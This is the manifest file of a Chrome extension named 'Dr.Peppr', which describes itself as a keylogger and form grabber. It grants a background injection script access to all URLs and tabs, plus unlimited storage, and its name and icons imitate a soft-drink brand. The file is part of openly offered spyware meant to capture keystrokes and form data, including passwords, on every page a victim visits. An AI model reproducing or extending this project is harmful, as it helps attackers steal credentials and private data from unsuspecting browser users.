{
  "name": "Dr.Peppr",
  "version": "1.0.4",
  "manifest_version": 2,
  "description": "A keylogger and form grabber for Google Chrome.",
  "icons": {
    "16": "icons/dr-pepper16.png",
    "48": "icons/dr-pepper48.png",
    "128": "icons/dr-pepper128.png"
  },
  "options_page": "src/options/index.html",
  "background": {
    "scripts": ["src/inject/inject.js"]
  },
  "permissions": [
    "<all_urls>",
    "tabs",
    "storage",
    "unlimitedStorage"
  ],
  "content_security_policy": "script-src 'self' https://stackpath.bootstrapcdn.com https://code.jquery.com https://cdn.jsdelivr.net; object-src 'self'"
}